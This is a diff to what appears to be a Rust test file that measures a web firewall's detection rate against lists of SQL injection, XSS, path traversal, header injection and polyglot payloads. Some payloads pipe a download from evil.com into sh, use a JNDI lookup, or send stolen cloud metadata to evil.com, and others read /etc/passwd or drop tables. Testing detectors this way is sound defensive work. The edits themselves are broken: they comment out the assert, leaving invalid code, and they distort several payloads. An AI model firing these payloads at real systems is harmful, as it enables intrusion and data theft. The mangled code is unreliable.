@@ -43,8 +43,7 @@ fn check_payloads_in_query(label: &str, payloads: &[&str]) {
 
     let total = payloads.len();
     let rate = if total > 0 { (blocked as f64 / total as f64) * 100.0 } else { 100.0 };
-    // We want at least 80% detection rate  
-    assert!(
+// We want at least 80% detection rate     assert!(
         rate >= 80.0,
         "[{}] Detection rate {:.1}% ({}/{}) — missed: {:?}",
         label, rate, blocked, total, &missed[..missed.len().min(10)]
@@ -88,43 +87,43 @@ fn check_payloads_in_body(label: &str, payloads: &[&str]) {
 #[test]
 fn test_sqli_classic_payloads() {
     let payloads: Vec<&str> = vec![
-        "' OR 1=1--",
+        "' OR 1=1 --",
         "' OR '1'='1",
         "' OR ''='",
-        "admin'--",
+        "admin' --",
         "1' OR '1'='1' /*",
-        "' UNION SELECT null--",
-        "' UNION SELECT null,null--",
-        "' UNION ALL SELECT 1,2,3--",
-        "' UNION SELECT username,password FROM users--",
-        "1; DROP TABLE users--",
-        "'; DROP TABLE users;--",
-        "1' AND 1=1--",
-        "1' AND 1=2--",
+        "' UNION SELECT null --",
+        "' UNION SELECT null,null --",
+        "' UNION ALL SELECT 1,2,3 --",
+        "' UNION SELECT username,password FROM users --",
+        "1; DROP TABLE users --",
+        "'; DROP TABLE users; --",
+        "1' AND 1=1 --",
+        "1' AND 1=2 --",
         "' OR 1=1#",
         "admin' #",
         "' OR 'x'='x",
         "') OR ('1'='1",
         "') OR ('x'='x",
-        "' OR 1=1 LIMIT 1--",
-        "1' ORDER BY 1--",
-        "1' ORDER BY 10--",
-        "' UNION SELECT @@version--",
-        "' UNION SELECT table_name FROM information_schema.tables--",
-        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
-        "1' AND (SELECT COUNT(*) FROM users)>0--",
-        "' HAVING 1=1--",
-        "' GROUP BY columnname HAVING 1=1--",
-        "'; INSERT INTO users VALUES('hacker','hacked')--",
-        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
-        "'; EXEC xp_cmdshell('dir')--",
-        "1; WAITFOR DELAY '0:0:5'--",
-        "1' AND SLEEP(5)--",
-        "1' AND BENCHMARK(5000000,MD5('test'))--",
-        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
-        "' INTO OUTFILE '/tmp/test.txt'--",
-        "1' AND extractvalue(1,concat(0x7e,version()))--",
-        "1' AND updatexml(1,concat(0x7e,version()),1)--",
+        "' OR 1=1 LIMIT 1 --",
+        "1' ORDER BY 1 --",
+        "1' ORDER BY 10 --",
+        "' UNION SELECT @@version --",
+        "' UNION SELECT table_name FROM information_schema.tables --",
+        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
+        "1' AND (SELECT COUNT(*) FROM users)>0 --",
+        "' HAVING 1=1 --",
+        "' GROUP BY columnname HAVING 1=1 --",
+        "'; INSERT INTO users VALUES('hacker','hacked') --",
+        "'; UPDATE users SET password='hacked' WHERE username='admin' --",
+        "'; EXEC xp_cmdshell('dir') --",
+        "1; WAITFOR DELAY '0:0:5' --",
+        "1' AND SLEEP(5) --",
+        "1' AND BENCHMARK(5000000,MD5('test')) --",
+        "' UNION SELECT LOAD_FILE('/etc/passwd') --",
+        "' INTO OUTFILE '/tmp/test.txt' --",
+        "1' AND extractvalue(1,concat(0x7e,version())) --",
+        "1' AND updatexml(1,concat(0x7e,version()),1) --",
     ];
     check_payloads_in_query("SQLi Classic", &payloads);
 }
@@ -132,12 +131,12 @@ fn test_sqli_classic_payloads() {
 #[test]
 fn test_sqli_comment_obfuscation() {
     let payloads: Vec<&str> = vec![
-        "1'/**/OR/**/1=1--",
-        "1'/**/UNION/**/SELECT/**/null--",
-        "1'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",
+        "1'/**/OR/**/1=1 --",
+        "1'/**/UNION/**/SELECT/**/null --",
+        "1'/**/UNION/**/ALL/**/SELECT/**/1,2,3 --",
         "/*!50000 SELECT */ * FROM users",
         "SELECT /*!32302 1/0, */ username FROM users",
-        "1' /*!UNION*/ /*!SELECT*/ null--",
+        "1' /*!UNION*/ /*!SELECT*/ null --",
         "1 AND/**/1=1",
         "SELECT/**/ password/**/FROM/**/users",
         "1'/*anything here*/OR/**/1=1",
@@ -149,15 +148,15 @@ fn test_sqli_comment_obfuscation() {
 #[test]
 fn test_sqli_encoding_evasion() {
     let payloads: Vec<&str> = vec![
-        "1%27%20OR%201=1--",
-        "1%27%20UNION%20SELECT%20null--",
+        "1%27%20OR%201=1 --",
+        "1%27%20UNION%20SELECT%20null --",
         "%27%20OR%20%271%27=%271",
-        "1%2527%20OR%201=1--",
-        "admin%27--",
-        "1' OR 0x31=0x31--",
-        "1' OR 0x41=0x41--",
-        "1' AND 0x1=0x1--",
-        "1' OR CHAR(49)=CHAR(49)--",
+        "1%2527%20OR%201=1 --",
+        "admin%27 --",
+        "1' OR 0x31=0x31 --",
+        "1' OR 0x41=0x41 --",
+        "1' AND 0x1=0x1 --",
+        "1' OR CHAR(49)=CHAR(49) --",
     ];
     check_payloads_in_query("SQLi Encoding", &payloads);
 }
@@ -165,15 +164,15 @@ fn test_sqli_encoding_evasion() {
 #[test]
 fn test_sqli_whitespace_evasion() {
     let payloads: Vec<&str> = vec![
-        "1'\tOR\t1=1--",
-        "1'\nOR\n1=1--",
-        "1'\rOR\r1=1--",
-        "1'\x0bOR\x0b1=1--",
+        "1'\tOR\t1=1 --",
+        "1'\nOR\n1=1 --",
+        "1'\rOR\r1=1 --",
+        "1'\x0bOR\x0b1=1 --",
         "UNION\tSELECT\tnull",
         "UNION\nSELECT\nnull",
-        "1'%09OR%091=1--",
-        "1'%0aOR%0a1=1--",
-        "1'%0dOR%0d1=1--",
+        "1'%09OR%091=1 --",
+        "1'%0aOR%0a1=1 --",
+        "1'%0dOR%0d1=1 --",
     ];
     check_payloads_in_query("SQLi Whitespace", &payloads);
 }
@@ -181,12 +180,12 @@ fn test_sqli_whitespace_evasion() {
 #[test]
 fn test_sqli_string_concat_evasion() {
     let payloads: Vec<&str> = vec![
-        "1' OR 'a'||'b'='ab'--",
-        "1' OR CONCAT('1','=','1')--",
-        "1' OR 'admin' LIKE 'adm%'--",
-        "1' OR LENGTH(password)>0--",
-        "1' OR SUBSTR(password,1,1)='a'--",
-        "1' OR ASCII(SUBSTR(password,1,1))>64--",
+        "1' OR 'a'||'b'='ab' --",
+        "1' OR CONCAT('1','=','1') --",
+        "1' OR 'admin' LIKE 'adm%' --",
+        "1' OR LENGTH(password)>0 --",
+        "1' OR SUBSTR(password,1,1)='a' --",
+        "1' OR ASCII(SUBSTR(password,1,1))>64 --",
     ];
     check_payloads_in_query("SQLi String Concat", &payloads);
 }
@@ -194,10 +193,10 @@ fn test_sqli_string_concat_evasion() {
 #[test]
 fn test_sqli_second_order() {
     let payloads: Vec<&str> = vec![
-        "user=admin' UNION SELECT null--&pass=x",
-        "id=1; SELECT pg_sleep(5)--",
-        "q=test&sort=1 UNION SELECT null--",
-        "search='; DELETE FROM sessions;--",
+        "user=admin' UNION SELECT null --&pass=x",
+        "id=1; SELECT pg_sleep(5) --",
+        "q=test&sort=1 UNION SELECT null --",
+        "search='; DELETE FROM sessions; --",
         "name=<script>alert(1)</script>&id=1' OR '1'='1",
     ];
     check_payloads_in_body("SQLi Second-Order", &payloads);
@@ -217,8 +216,8 @@ fn test_xss_basic_payloads() {
         "<SCRIPT>alert(1)</SCRIPT>",
         "<ScRiPt>alert(1)</ScRiPt>",
         "<script>alert(String.fromCharCode(88,83,83))</script>",
-        "<<script>alert(1)//",
-        "<script///>alert(1)</script>",
+        "<<script>alert(1) //",
+        "<script ///>alert(1)</script>",
         "<script>eval('al'+'ert(1)')</script>",
     ];
     check_payloads_in_body("XSS Basic", &payloads);
@@ -240,7 +239,7 @@ fn test_xss_event_handlers() {
         "<object data=javascript:alert(1)>",
         "<embed src=javascript:alert(1)>",
         "<body onpageshow=alert(1)>",
-        "<img src=1 onerror=alert(1)//",
+        "<img src=1 onerror=alert(1) //",
         "<div onmouseover=alert(1)>hover me</div>",
     ];
     check_payloads_in_body("XSS Event Handlers", &payloads);
@@ -266,16 +265,16 @@ fn test_xss_encoding_evasion() {
 #[test]
 fn test_xss_polyglot() {
     let payloads: Vec<&str> = vec![
-        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() ) //",
         "\"><img src=x onerror=alert(1)>",
         "'><script>alert(1)</script>",
-        "\"autofocus onfocus=alert(1)//",
+        "\"autofocus onfocus=alert(1) //",
         "<svg/onload=alert(1)>",
         "<svg/onload=alert`1`>",
-        "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=x onerror=alert(1)\">",
-        "\"><svg/onload=alert(1)//",
+        "<math><mtext><table><mglyph><style><! --</style><img title=\"--><img src=x onerror=alert(1)\">",
+        "\"><svg/onload=alert(1) //",
         "'-alert(1)-'",
-        "\";alert(1)//",
+        "\";alert(1) //",
     ];
     check_payloads_in_body("XSS Polyglot", &payloads);
 }
@@ -377,7 +376,7 @@ fn test_cmdi_windows() {
 fn test_path_traversal_basic() {
     let payloads: Vec<&str> = vec![
         "file=../../../etc/passwd",
-        "file=....//....//....//etc/passwd",
+        "file=.... //....//....//etc/passwd",
         "file=..\\..\\..\\windows\\system32\\config\\sam",
         "file=/etc/passwd",
         "file=/etc/shadow",
@@ -469,7 +468,7 @@ fn test_header_injection() {
         ("User-Agent", "() { :; }; /bin/bash -i"),
         ("User-Agent", "${jndi:ldap://evil.com/x}"),
         ("Referer", "<script>alert(1)</script>"),
-        ("Cookie", "' OR 1=1--"),
+        ("Cookie", "' OR 1=1 --"),
         ("X-Custom", "{{7*7}}"),
         ("X-Custom", "${7*7}"),
         ("Accept-Language", "\r\nX-Injected: header"),
@@ -478,7 +477,7 @@ fn test_header_injection() {
 
     let mut blocked = 0usize;
     for (header_name, header_value) in &header_payloads {
-        let headers = vec![(*header_name, *header_value)];
+        let headers = vec![(header_name.to_string(), header_value.to_string())];
         let req = HttpRequest {
             client_ip: client_ip(),
             method: "GET",
@@ -508,15 +507,15 @@ fn test_header_injection() {
 #[test]
 fn test_polyglot_attacks() {
     let payloads: Vec<&str> = vec![
-        "1' UNION SELECT '<script>alert(1)</script>'--",
+        "1' UNION SELECT '<script>alert(1)</script>' --",
         "<script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62))</script>",
-        "'; cat /etc/passwd; echo '<script>alert(1)</script>'--",
+        "'; cat /etc/passwd; echo '<script>alert(1)</script>' --",
         "1; SELECT pg_sleep(5); --<script>",
-        "../../../etc/passwd' UNION SELECT null--",
+        "../../../etc/passwd' UNION SELECT null --",
         "; wget http://evil.com -O- | sh; echo '<img src=x onerror=alert(1)>'",
         "${jndi:ldap://evil.com/x}<script>alert(1)</script>",
         "{{7*7}}<script>alert(1)</script>",
-        "<script>fetch('http://169.254.169.254/').then(r=>r.text()).then(t=>fetch('http://evil.com/?d='+t))</script>",
+        "<script>fetch('http://169.254.169.254/').then(r=>r.text).then(t=>fetch('http://evil.com/?d='+t))</script>",
     ];
     check_payloads_in_body("Polyglot Mixed", &payloads);
 }
